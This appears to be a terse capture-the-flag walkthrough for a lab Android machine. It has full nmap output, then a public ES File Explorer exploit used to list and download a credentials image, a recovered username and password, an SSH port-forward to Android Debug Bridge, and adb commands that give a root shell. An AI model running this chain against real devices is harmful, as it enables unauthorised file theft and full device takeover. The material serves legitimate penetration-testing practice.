@@ -1,0 +1,85 @@
+└─$ nmap -A 10.10.10.247 -p 1-65535 -T5 -Pn
+PORT      STATE SERVICE VERSION
+2222/tcp  open  ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  2048 7190e3a7c95d836634883debb4c788fb (RSA)
+34427/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 19 Aug 2024 16:17:06 GMT
+|     Content-Length: 22
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|   GetRequest: 
+|     HTTP/1.1 412 Precondition Failed
+|     Date: Mon, 19 Aug 2024 16:17:06 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 501 Not Implemented
+|     Date: Mon, 19 Aug 2024 16:17:11 GMT
+|     Content-Length: 29
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Method not supported: OPTIONS
+|   Help: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 19 Aug 2024 16:17:26 GMT
+|     Content-Length: 26
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: HELP
+|   RTSPRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 19 Aug 2024 16:17:11 GMT
+|     Content-Length: 39
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     valid protocol version: RTSP/1.0
+|   SSLSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 19 Aug 2024 16:17:26 GMT
+|     Content-Length: 73
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ?G???,???`~?
+|     ??{????w????<=?o?
+|   TLSSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 19 Aug 2024 16:17:26 GMT
+|     Content-Length: 71
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ??random1random2random3random4
+|   TerminalServerCookie: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 19 Aug 2024 16:17:26 GMT
+|     Content-Length: 54
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|_    Cookie: mstshash=nmap
+42135/tcp open  http    ES File Explorer Name Response httpd
+|_http-title: Site doesn't have a title (text/html).
+59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn't have a title (text/plain).
+
+https://www.exploit-db.com/exploits/50070
+python3 ./50070.py listFiles 10.10.10.247
+python3 ./50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
+
+Kristi
+Kr1sT!5h@Rp3xPl0r3!
+
+ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
+adb connect 127.0.0.1:5555
+adb root
+adb shell
+
+
